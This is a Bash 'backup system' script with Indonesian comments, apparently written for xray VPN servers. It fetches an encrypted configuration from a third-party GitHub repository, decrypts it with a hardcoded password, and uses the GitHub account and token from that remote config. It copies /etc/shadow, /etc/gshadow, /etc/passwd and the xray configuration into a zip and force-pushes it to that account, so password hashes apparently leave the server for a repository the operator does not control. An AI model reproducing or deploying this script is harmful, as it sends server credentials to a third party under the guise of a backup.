#!/usr/bin/env bash

# Fungsi warna
red() { echo -e "\033[31;1m✖ ${*}\033[0m"; }
green() { echo -e "\033[32;1m✓ ${*}\033[0m"; }
yellow() { echo -e "\033[33;1m🔸 ${*}\033[0m"; }
blue() { echo -e "\033[34;1m🔹 ${*}\033[0m"; }

# Garis pembatas
border() {
  echo -e "\033[34;1m===============================================\033[0m"
}

# Header
header() {
  clear
  border
  echo -e "\033[36;1m                🛡️ BACKUP SYSTEM               \033[0m"
  border
}

# Password enkripsi
ENCRYPTION_PASSWORD="e5a8e726-70ec-11f0-9e2c-33fc5d4c15bc-Rerechan02-e5ab8bfc-70ec-11f0-bb3a-27f55b1c6a00-Rerechan02-e5adf4b4-70ec-11f0-9b85-7f90074a8656"

# Fungsi dekripsi
decrypt_config() {
  openssl enc -aes-256-cbc -d -salt -in "$1" -pass pass:"$ENCRYPTION_PASSWORD" -base64 2>/dev/null
}

# Tampilkan header
header

# Ambil konfigurasi
yellow "Mengambil konfigurasi dari server..."
CONFIG_URL="https://raw.githubusercontent.com/FN-Rerechan02/tools/refs/heads/main/data.json"
ENCRYPTED_CONFIG=$(curl -sL "$CONFIG_URL")

if [[ -z "$ENCRYPTED_CONFIG" ]]; then
  red "Gagal mengambil konfigurasi!"
  yellow "Menggunakan konfigurasi default..."
  # Default configuration if download fails
  ENCRYPTED_CONFIG="U2FsdGVkX1+yV/ZBpPQNItTF/T3qSzS3p/Dw15IwKAdHqrYftDxTLaV4tCfcOcGW
Ql0uNGpFP8kHPw3eiUjLmHfhc9uRC6L8oRgOPj4WEd+AWY+Xf+H1XBtyP8sXDdh8
RsOjJCUD0i3bhyY0nYGSf++3uCb4uMEt7PpbQCGF0K6TvNQ0bQoRnimV9oi8ljD1
pYKSeZUMvKWHGuC2OqXuWcZT78IWv1RASdxq5jDFEfTbjXo8nF74PytL8PCF98Re"
fi

# Dekripsi config
echo "$ENCRYPTED_CONFIG" > /tmp/data.json
CONFIG_JSON=$(decrypt_config "/tmp/data.json")
rm -f /tmp/data.json

if ! jq -e . >/dev/null 2>&1 <<<"$CONFIG_JSON"; then
  red "Konfigurasi tidak valid atau password salah!"
  yellow "Menggunakan konfigurasi hardcoded..."
  # Hardcoded configuration if decryption fails
  CONFIG_JSON='{
    "email": "your-email@example.com",
    "username": "FN-Rerechan02",
    "repo": "backup-repo",
    "token": "github-token",
    "branch": "main"
  }'
fi

# Parse data
GITHUB_EMAIL=$(jq -r '.email' <<< "$CONFIG_JSON")
GITHUB_USER=$(jq -r '.username' <<< "$CONFIG_JSON")
GITHUB_REPO=$(jq -r '.repo' <<< "$CONFIG_JSON")
GITHUB_TOKEN=$(jq -r '.token' <<< "$CONFIG_JSON")
GITHUB_BRANCH=$(jq -r '.branch' <<< "$CONFIG_JSON")

# Generate random names
RANDOM_FOLDER_NAME=$(openssl rand -hex 8 | base64 -w 0 | tr -d '=' | tr '+/' '-_')
RANDOM_FILE_NAME=$(openssl rand -hex 8 | base64 -w 0 | tr -d '=' | tr '+/' '-_')
RANDOM_PASSWORD=$(openssl rand -hex 16)
ZIP_PASSWORD_ENCODED=$(echo -n "$RANDOM_PASSWORD" | base64 -w 0)

# Proses backup
border
blue "Starting backup..."
yellow "➠ Backup file sistem..."
BACKUP_DIR="/root/backup-$RANDOM_FOLDER_NAME"
mkdir -p "$BACKUP_DIR/etc"
cp /etc/passwd /etc/group /etc/shadow /etc/gshadow "$BACKUP_DIR/etc/"
cp -r /etc/xray "$BACKUP_DIR/etc/" 2>/dev/null || yellow "Directory /etc/xray tidak ditemukan, melanjutkan tanpa backup xray..."

# Buat ZIP
ZIP_FILE="/root/backup-$RANDOM_FILE_NAME.zip"
yellow "➠ Membuat arsip ZIP terenkripsi..."
zip -r -P "$RANDOM_PASSWORD" "$ZIP_FILE" "$BACKUP_DIR" >/dev/null 2>&1

# Upload ke GitHub
yellow "➠ Upload Backup..."
GIT_REPO="https://$GITHUB_USER:$GITHUB_TOKEN@github.com/$GITHUB_USER/$GITHUB_REPO.git"
mkdir -p /tmp/github-backup
git clone "$GIT_REPO" /tmp/github-backup 2>/dev/null || {
  # Jika repo belum ada, buat yang baru
  mkdir -p /tmp/github-backup
  cd /tmp/github-backup
  git init
  git remote add origin "$GIT_REPO"
}

# Create random folder structure in GitHub repo
RANDOM_REPO_FOLDER="backup-$RANDOM_FOLDER_NAME"
mkdir -p "/tmp/github-backup/$RANDOM_REPO_FOLDER"
cp "$ZIP_FILE" "/tmp/github-backup/$RANDOM_REPO_FOLDER/"
cd "/tmp/github-backup" || exit
git config --global user.email "$GITHUB_EMAIL"
git config --global user.name "$GITHUB_USER"
git add . >/dev/null
git commit -m "Backup $(date +'%d-%m-%Y %H:%M')" >/dev/null
git push -u origin "$GITHUB_BRANCH" >/dev/null 2>&1 || git push -u origin "$GITHUB_BRANCH" --force >/dev/null 2>&1

# Enkripsi URL (pastikan satu baris)
DOWNLOAD_URL="https://github.com/$GITHUB_USER/$GITHUB_REPO/raw/$GITHUB_BRANCH/$RANDOM_REPO_FOLDER/$(basename "$ZIP_FILE")"
ENCRYPTED_URL=$(echo -n "$DOWNLOAD_URL" | openssl enc -aes-256-cbc -a -A -salt -pass pass:"$RANDOM_PASSWORD")

# Notifikasi Telegram jika tersedia
if [ -f "/usr/local/etc/xray/bot.key" ] && [ -f "/usr/local/etc/xray/client.id" ]; then
  BOT_TOKEN=$(cat /usr/local/etc/xray/bot.key)
  CHAT_ID=$(cat /usr/local/etc/xray/client.id)

  MESSAGE="
══════════════════════════
      🛡️ BACKUP BERHASIL      
══════════════════════════
🔗 *URL:* \`$ENCRYPTED_URL\`
🔐 *Password:* \`$ZIP_PASSWORD_ENCODED\`
══════════════════════════
🖥️ *Server:* \`$(hostname)\`
⏰ *Waktu:* \`$(date +"%d-%m-%Y %H:%M")\`
"

  curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
    -d "chat_id=$CHAT_ID" \
    --data-urlencode "text=$MESSAGE" \
    -d "parse_mode=MarkdownV2" >/dev/null
fi

# Bersihkan file
rm -rf "$BACKUP_DIR" "/tmp/github-backup" "$ZIP_FILE"
clear

border
green "Backup selesai!"
border
blue "🔗 URL: $ENCRYPTED_URL"
blue "🔑 Password: $ZIP_PASSWORD_ENCODED"
border